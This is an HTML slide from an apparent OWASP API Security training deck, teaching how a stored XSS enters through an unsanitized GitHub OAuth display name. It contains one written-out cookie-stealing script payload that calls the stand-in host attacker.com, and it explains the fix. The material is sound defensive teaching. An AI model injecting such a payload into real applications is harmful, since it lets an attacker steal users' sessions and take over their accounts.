@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>API10:2023 &#x2014; Unsafe Consumption of APIs &#xb7; Slide 16 of 28</title>
+<link rel="stylesheet" href="api10-shared.css">
+</head>
+<body>
+<div class="top-nav">
+  <div class="nav-left"><span class="nav-badge">API10:2023</span><span class="nav-title">Unsafe Consumption of APIs</span></div>
+  <span class="nav-right">Slide 16 of 28</span>
+</div>
+<div class="progress-wrap">
+  <div class="tab-nav"><a class="seg done" href="api10-slide-01.html"></a><a class="seg done" href="api10-slide-02.html"></a><a class="seg done" href="api10-slide-03.html"></a><a class="seg done" href="api10-slide-04.html"></a><a class="seg done" href="api10-slide-05.html"></a><a class="seg done" href="api10-slide-06.html"></a><a class="seg done" href="api10-slide-07.html"></a><a class="seg done" href="api10-slide-08.html"></a><a class="seg done" href="api10-slide-09.html"></a><a class="seg done" href="api10-slide-10.html"></a><a class="seg done" href="api10-slide-11.html"></a><a class="seg done" href="api10-slide-12.html"></a><a class="seg done" href="api10-slide-13.html"></a><a class="seg done" href="api10-slide-14.html"></a><a class="seg done" href="api10-slide-15.html"></a><a class="seg active" href="api10-slide-16.html"></a><a class="seg" href="api10-slide-17.html"></a><a class="seg" href="api10-slide-18.html"></a><a class="seg" href="api10-slide-19.html"></a><a class="seg" href="api10-slide-20.html"></a><a class="seg" href="api10-slide-21.html"></a><a class="seg" href="api10-slide-22.html"></a><a class="seg" href="api10-slide-23.html"></a><a class="seg" href="api10-slide-24.html"></a><a class="seg" href="api10-slide-25.html"></a><a class="seg" href="api10-slide-26.html"></a><a class="seg" href="api10-slide-27.html"></a><a class="seg" href="api10-slide-28.html"></a></div>
+  <div class="progress-labels"><span>Part 3 &#xb7; Attack Scenarios</span><span>Slide 16</span></div>
+</div>
+<div class="slide active">
+
+  <div class="slide-eyebrow">Slide 16 &#xb7; Scenario 3</div>
+  <div class="slide-title">A third-party social profile API returns XSS in a display name. The consuming API stores and renders it.</div>
+  <div class="slide-subtitle">User-submitted names go through XSS sanitization. Names from &#x201C;verified&#x201D; social logins don&#x2019;t.</div>
+  <div class="source-tag">&#x1F4C4; OWASP API Security Top 10 2023 &#xb7; API10:2023 Example Attack Scenarios</div>
+  <div class="scenario-card">
+    <div class="scenario-num">SCENARIO 3</div>
+    <div class="scenario-title">Stored XSS via unsanitized third-party OAuth profile field</div>
+    <div class="scenario-body">
+      <p>A collaboration platform supports &#x201C;Sign in with GitHub.&#x201D; During login, the API fetches the user&#x2019;s GitHub profile using the GitHub API and stores the returned <code>name</code> field as the user&#x2019;s display name in the platform&#x2019;s database.</p>
+      <p>The platform&#x2019;s own profile update form applies HTML escaping to display names &#x2014; this was added after an earlier XSS report. But the GitHub OAuth flow takes a different code path. The display name from GitHub is stored directly without escaping, because the developer assumed GitHub profiles contain valid, safe display names.</p>
+      <p>An attacker creates a GitHub account with the display name: <code>&lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code>. They log into the platform with this GitHub account. The platform stores the XSS payload as their display name. Every user who views a project where this account is a collaborator has their session cookie exfiltrated. The attacker impersonates those users without ever touching the platform&#x2019;s own user management.</p>
+    </div>
+    <div class="scenario-why"><strong>The API10 failure:</strong> Output encoding was applied to user-submitted profile updates but not to profile data from OAuth providers. The fix: apply the same HTML escaping on output regardless of where the stored value originated. Trust in the data source does not determine whether escaping is needed &#x2014; the render context does.</div>
+  </div>
+  <div class="btn-row">
+    <a class="btn-secondary" href="api10-slide-15.html">&#x2190; Back</a>
+    <a class="btn-primary" href="api10-slide-17.html">The pattern &#x2192;</a>
+  </div>
+
+</div>
+<div class="page-footer"><a href="sources.html">&#x1F4C4; View sources</a></div>
+</body>
+</html>
